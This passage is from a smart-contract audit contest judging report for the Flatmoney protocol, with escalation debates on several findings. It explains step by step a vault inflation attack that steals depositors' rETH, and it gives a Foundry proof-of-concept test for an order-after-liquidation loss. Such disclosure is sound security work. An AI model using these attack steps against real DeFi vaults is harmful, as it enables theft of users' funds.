a) put a daily cap on the number of available FMP
b) remove the trade volume minting altogether

**0xcrunch**

Rewarding an issue publicly known as acceptable is unfair to watsons who didn't submit the issue out of respecting of Sherlock rules.

**Czar102**

I'd normally consider this a valid issue given that the points may have some value, but given the sponsor's message referenced in https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/187#issuecomment-1956258407, I think this should be considered informational.

Planning to accept the escalation and invalidate the issue.

**nevillehuang**

@Czar102 Fair enough, given the new hierachy of truth in place, I believe this can be low severity, unless watsons have any contest details and/or protocol documentation indicating a incentivized use case of points. @xiaoming9090 @securitygrid 

> Hierarchy of truth: Contest README > Sherlock rules for valid issues > protocol documentation (including code comments) > protocol answers on the contest public Discord channel.



**novaman33**

@Czar102 , I believe there are several code comments that suggest that points are incentive:
In `PointsModule.sol` 
```
/// @title PointsModule
/// @author dHEDGE
/// @notice Module for awarding points as an incentive.
```

And before owner mintTo function:
```
/// @notice Owner can mint points to any account. 
This can be used to distribute points to competition winners and other reward incentives.
    ///         The points start a 12 month unlock tax (update unlockTime).
 ```
These state that points will be used as an encouragement, meaning they will either be something of value or be used to obtain something of value. I cannot agree that being able to obtain large amounts of points is a low severity case, given the comments in the code, which in the sherlock's Hierarchy of truth have more weight than protocol answers on the contest public Discord channel.

**nevillehuang**

> @Czar102 , I believe there are several code comments that suggest that points are incentive: In `PointsModule.sol`
> 
> ```
> /// @title PointsModule
> /// @author dHEDGE
> /// @notice Module for awarding points as an incentive.
> ```
> 
> And before owner mintTo function:
> 
> ```
> /// @notice Owner can mint points to any account. 
> This can be used to distribute points to competition winners and other reward incentives.
>     ///         The points start a 12 month unlock tax (update unlockTime).
> ```
> 
> These state that points will be used as an encouragement, meaning they will either be something of value or be used to obtain something of value. I cannot agree that being able to obtain large amounts of points is a low severity case, given the comments in the code, which in the sherlock's Hierarchy of truth have more weight than protocol answers on the contest public Discord channel.

Good point, in that case, I believe this issue should remain medium severity, given code comments (as seen [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/PointsModule.sol#L14) and [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/PointsModule.sol#L89) has a greater significance than discord messages as shown in the hierarchy of truth [above](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/187#issuecomment-1970591636)

**Czar102**

I believe considering something an incentive doesn't imply this functionality being important enough for issues regarding it to be considered valid, while the sponsor's comment directly specified whether the issues of the type are valid. Also, these comments don't contradict the sponsor's comment at all.

I stand by the previous proposition to invalidate the issue.

**novaman33**

@Czar102 the contracts in scope are stated in the readMe. The sponsor said " we can be ok with issues with the same.",  by which they state issues related to the points module are out of scope. I cannot understand why the points module is in scope in the first place. Given the Hierarchy of truth I believe points module are still in scope.


**nevillehuang**

@Czar102 I don't quite get your statement, it was already stated explicitly in code comments of the contract that points are meant to have an incentivized use case. So by hierarchy of truth, this is clearly a medium severity issue (and maybe can even be argued as high severity). Whatever it is, I will respect your decision, but hoping for a better clarification.

**Czar102**

Given the hierarchy of truth, I think this issue is indeed a valid Medium.

Planning to reject the escalation and leave the issue as is.

**Evert0x**

Result:
Medium
Has Duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/187/#issuecomment-1956094137): rejected

# Issue M-9: Vault Inflation Attack 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/190 

The protocol has acknowledged this issue.

## Found by 
santipu\_, xiaoming90
## Summary

Malicious users can perform an inflation attack against the vault to steal the assets of the victim.

## Vulnerability Detail

A malicious user can perform a donation to execute a classic first depositor/ERC4626 inflation Attack against the FlatCoin vault. The general process of this attack is well-known, and a detailed explanation of this attack can be found in many of the resources such as the following:

- https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks
- https://mixbytes.io/blog/overview-of-the-inflation-attack

In short, to kick-start the attack, the malicious user will often usually mint the smallest possible amount of shares (e.g., 1 wei) and then donate significant assets to the vault to inflate the number of assets per share. Subsequently, it will cause a rounding error when other users deposit.

However, in Flatcoin, there are various safeguards in place to mitigate this attack. Thus, one would need to perform additional steps to workaround/bypass the existing controls.

Let's divide the setup of the attack into two main parts:

1. Malicious user mint 1 mint of share
2. Donate or transfer assets to the vault to inflate the assets per share

#### Part 1 - Malicious user mint 1 mint of share

Users could attempt to mint 1 wei of share. However, the validation check at Line 79 will revert as the share minted is less than `MIN_LIQUIDITY` = 10_000. However, this minimum liquidation requirement check can be bypassed.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L61

```solidity
File: StableModule.sol
61:     function executeDeposit(
62:         address _account,
63:         uint64 _executableAtTime,
64:         FlatcoinStructs.AnnouncedStableDeposit calldata _announcedDeposit
65:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _liquidityMinted) {
66:         uint256 depositAmount = _announcedDeposit.depositAmount;
67: 
68:         uint32 maxAge = _getMaxAge(_executableAtTime);
69: 
70:         _liquidityMinted = (depositAmount * (10 ** decimals())) / stableCollateralPerShare(maxAge);
71: 
72:         if (_liquidityMinted < _announcedDeposit.minAmountOut)
73:             revert FlatcoinErrors.HighSlippage(_liquidityMinted, _announcedDeposit.minAmountOut);
74: 
75:         _mint(_account, _liquidityMinted);
76: 
77:         vault.updateStableCollateralTotal(int256(depositAmount));
78: 
79:         if (totalSupply() < MIN_LIQUIDITY) // @audit-info MIN_LIQUIDITY = 10_000
80:             revert FlatcoinErrors.AmountTooSmall({amount: totalSupply(), minAmount: MIN_LIQUIDITY});
```

First, Bob mints 10000 wei shares via `executeDeposit` function. Next, Bob withdraws 9999 wei shares via the `executeWithdraw`. In the end, Bob successfully owned only 1 wei share, which is the prerequisite for this attack.

#### Part 2 - Donate or transfer assets to the vault to inflate the assets per share

The vault tracks the number of collateral within the state variables. Thus, simply transferring rETH collateral to the vault directly will not work, and the assets per share will remain the same.

To work around this, Bob creates a large number of accounts (with different wallet addresses). He could choose any or both of the following methods to indirectly transfer collateral to the LP pool/vault to inflate the assets per share:

1) Open a large number of leveraged long positions with the intention of incurring large amounts of losses. The long positions' losses are the gains of the LPs, and the collateral per share will increase.
2) Open a large number of leveraged long positions till the max skew of 120%. Thus, this will cause the funding rate to increase, and the long will have to pay the LPs, which will also increase the collateral per share.

#### Triggering rounding error

The `stableCollateralPerShare` will be inflated at this point. Following is the formula used to determine the number of shares minted to the depositor.

If the `depositAmount` by the victim is not sufficiently large enough, the amount of shares minted to the depositor will round down to zero.

```solidity
_collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;
_liquidityMinted = (depositAmount * (10 ** decimals())) / _collateralPerShare
```

Finally, the attacker withdraws their share from the pool. Since they are the only ones with any shares, this withdrawal equals the balance of the vault. This means the attacker also withdraws the tokens deposited by the victim earlier.

## Impact

Malicous users could steal the assets of the victim.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L61

## Tool used

Manual Review

## Recommendation

A `MIN_LIQUIDITY` amount of shares needs to exist within the vault to guard against a common inflation attack.

However, the current approach of only checking if the `totalSupply() < MIN_LIQUIDITY` is not sufficient, and could be bypassed by making use of the withdraw function.

A more robust approach to ensuring that there is always a minimum number of shares to guard against inflation attack is to mint a certain amount of shares to zero address (dead address) during contract deployment (similar to what has been implemented in Uniswap V2). 



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**ubl4nk** commented:
> invalid or Low-Impact -> Bob can't deposit 10_000 wei and withdraw 9_999, because there are delayed-orders (orders become pending), there are no sorted orders and keepers can select to execute which orders first

**takarez** commented:
>  invalid



**0xLogos**

Escalate 

Low. Attack is too risky.

There is no frontrunning so attacker must prepare attack in advance. Someone can deposit amount larger than attacker expected and take his money.

**sherlock-admin2**

> Escalate 
> 
> Low. Attack is too risky.
> 
> There is no frontrunning so attacker must prepare attack in advance. Someone can deposit amount larger than attacker expected and take his money.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**0xLogos**

> If the depositAmount by the victim is not sufficiently large enough, the amount of shares minted to the depositor will round down to zero.

But if deposit is large enough, attacker will lose.

**santipu03**

Hi @0xLogos,

Check my dup issue for clarification (#128) but the attacker can easily provoke a permanent DoS on the Vault by being the first depositor. In case a user deposits an insane amount of funds to pass the `MIN_LIQUIDITY` check, the attacker would be able to steal most of the funds as a classic inflation attack. 

**xiaoming9090**

> Escalate
> 
> Low. Attack is too risky.
> 
> There is no frontrunning so attacker must prepare attack in advance. Someone can deposit amount larger than attacker expected and take his money.

The escalation is invalid. Refer to the santipu03 response above. To add to his response:

The attack can be executed without frontrunning once the vault has been "set up" by the malicious user (After completing Steps 1 and 2 in the above report). Afterward, victims whose `depositAmount` is not sufficiently large enough will lose their assets to the attacker.

Also, the claim in the escalation that someone depositing an amount larger than the attacker will cause the attacker's money to be stolen is baseless.

**0xcrunch**

This is a low/QA, the issue can be easily mitigated by sponsor conducting a sacrificial deposit in the same transaction of deploying the Vault.


**xiaoming9090**

> This is a low/QA, the issue can be easily mitigated by sponsor conducting a sacrificial deposit in the same transaction of deploying the Vault.

Disagree. There is no evidence provided to Watsons in the public domain during the audit contest period (22 Jan to 4 Feb) that states that the protocol team will perform a sacrificial deposit when deploying the vault.

**r0ck3tzx**

This attack is absolutely not practical in the environment where front-running is not possible such as Base and its not possible to have general MEV agents - see the recent Radiant hack. If this issue would be considered valid then all reported front-running issues should be as well. Thus the The low/QA severity is more appropriate for this issue.


**Czar102**

I believe that this is a borderline Med/Low that should be included as Med since it's possible to guess, or to somehow get to know the timing of the deposit, which is the only information the attacker needs.

Planning to reject the escalation and leave the issue as is.

**nevillehuang**

Agree with @Czar102 and @xiaoming9090 

**Czar102**

Result:
Medium
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/190/#issuecomment-1956476732): rejected

# Issue M-10: Announced orders of a position are not deleted when liquidation happens 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/287 

## Found by 
juan
## Summary
Announced orders of a position are not deleted when liquidation happens

## Vulnerability Detail
When a position is liquidated, an existing announced order for that position is not deleted. This means that the user's order can still be executed after liquidation of the position. This is only an issue for leverageAdjut orders, and only if the points module is removed (and this has been said to be a temporary feature by the devs, so the points module is likely to be removed in the future).

## Impact
Once the points module is removed, a user's leverageAdjust order with positive `additionalSizeAdjustment` will still execute after the position has been liquidated.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L147

## Tool used
Manual Review

## Recommendation
Delete announced orders of a position when the position is liquidated



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid

**takarez** commented:
>  valid: high(10)



**santipu03**

Escalate

This issue should be invalid because the transaction will revert when checking the owner of the ERC-721 position. If the position has been liquidated, the leverage adjustment is going to revert in [this line](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L226). Because the token has been burned, `ownerOf` will revert.

The Watson here is making assumptions on future code changes but the attack path is not feasible with the current state of the code. 

**sherlock-admin2**

> Escalate
> 
> This issue should be invalid because the transaction will revert when checking the owner of the ERC-721 position. If the position has been liquidated, the leverage adjustment is going to revert in [this line](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L226). Because the token has been burned, `ownerOf` will revert.
> 
> The Watson here is making assumptions on future code changes but the attack path is not feasible with the current state of the code. 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**RealLTDingZhen**

Escalate

Should be invalid because this has the same path as [issue227](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/227)

**sherlock-admin2**

> Escalate
> 
> Should be invalid because this has the same path as [issue227](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/227)

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**0xjuaan**

I submitted this issue because:
1. When I told the sponsor about it, they thanked me and said that they would definitely need to fix it.
2. The sponsor also said that they are likely to remove the PointsModule in the future, and that would cause the vulnerability.

I do understand if this were to be invalidated since the attack is technically blocked. 

However if I did not provide this information to the protocol, they could have easily removed the points module features, deployed the vulnerable code to mainnet, and user funds would be lost. But this report has prevented that, so I believe that it should be rewarded.

**nevillehuang**

@0xjuaan Can you provide a coded PoC and a clearer description of what is the impact here, namely (fund loss, DoS or breaks core contract functionality)

**0xjuaan**

@nevillehuang A coded PoC won't work, since the issue requires the 3 lines of points module code to be removed. 

However if it was removed as stated by sponsor, here's the impact (fund loss for users):
User announces order to increase position size -> Position gets liquidated -> Keeper executes user's  pending order (since it wasn't deleted) -> User can never get back those funds since any attempt to announce an order for that position will revert.

Do you still want a coded PoC? It would require removing the points modules code from the LeverageModule contract

**nevillehuang**

Which 3 lines are you referring to? Are they code logic that are intended to be removed?

@0xjuaan If yes please do that, I believe if the understanding of the codebase is correct, its can warrant validity based on this comment [here](https://github.com/sherlock-audit/2023-12-jojo-exchange-update-judging/issues/30#issuecomment-1936076314)

**0xjuaan**

The 3 lines are [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L226-L229) and yes, the sponsor has said that the points module is likely to be removed, and they encouraged me to submit this issue + admitted that they would make sure to fix it. You can confirm this with @rashtrakoff

I already had most of the PoC ready, since I sent it to the sponsor on discord a while ago. However sponsor only let me know at the end of the contest that the points module is likely to be removed, so I only had 8 mins to submit this report at the end of the contest, which is why the explanation is a bit limited in the report and PoC wasn't provided.

PoC is below. To run it, place the given function in `Liquidate.t.sol` and comment out the three lines of code that I linked above.
<details>
<summary> POC </summary>

```javascript
function test_executeLeverageAdjust_postLiquidation() public {
    setWethPrice(1000e8);

    uint256 tokenId = announceAndExecuteDepositAndLeverageOpen({
        traderAccount: alice,
        keeperAccount: keeper,
        depositAmount: 100e18,
        margin: 10e18,
        additionalSize: 30e18,
        oraclePrice: 1000e8,
        keeperFeeAmount: 0
    });
    
    setWethPrice(750e8);

    // user announces order, this sends 3e18 of margin to DelayedOrder
    announceAdjustLeverage(alice, tokenId, 3e18, 2e18 , 0);

    skip(uint256(vaultProxy.minExecutabilityAge())); 

    // user gets liquidated, before the 3e18 of margin goes to vault
    vm.startPrank(liquidator);
    liquidationModProxy.liquidate(tokenId);

    // only now after liquidation, the 3e18 of margin is sent to the vault
    executeAdjustLeverage(keeper, alice, 750e8);
    vm.stopPrank();

    // Try to close position, but can't (so funds are lost forever)
    vm.prank(alice);
    vm.expectRevert("ERC721: invalid token ID");
    delayedOrderProxy.announceLeverageClose(tokenId, 500, 1e18);
}
```
</details>

Thank you for looking into this @nevillehuang 

**RealLTDingZhen**

> The sponsor also said that they are likely to remove the PointsModule in the future, and that would cause the vulnerability.

Where did sponsors say that?

**rashtrakoff**

@0xjuaan I didn't say it is likely to be removed but rather it is not a core fixture of the protocol so points per dize can be set to 0 or in other words _can_ be deprecated.

**0xjuaan**

![image](https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/122077337/5c458bf8-66c1-437c-879c-0fb03a318af1)

> not a permanent fixture

This is what I was going off of, I thought this means that the points module is not permanent.


**rashtrakoff**

Yes, that's what I wanted to say. Someday we will deprecate it. Which day, not sure.

**securitygrid**

Can deleting code be considered an issue? unacceptable

**nevillehuang**

Based on sponsors comments [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/287#issuecomment-1961283663), I believe this issue to be invalid.

**Czar102**

Planning to invalidate as to my knowledge, there should be no expectation for the codebase to work without the `PointsModule`. Will accept only the first escalation.

**Czar102**

Result:
Invalid
Unique

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [santipu03](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/287/#issuecomment-1955081905): accepted
- [RealLTDingZhen](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/287/#issuecomment-1956653337): rejected

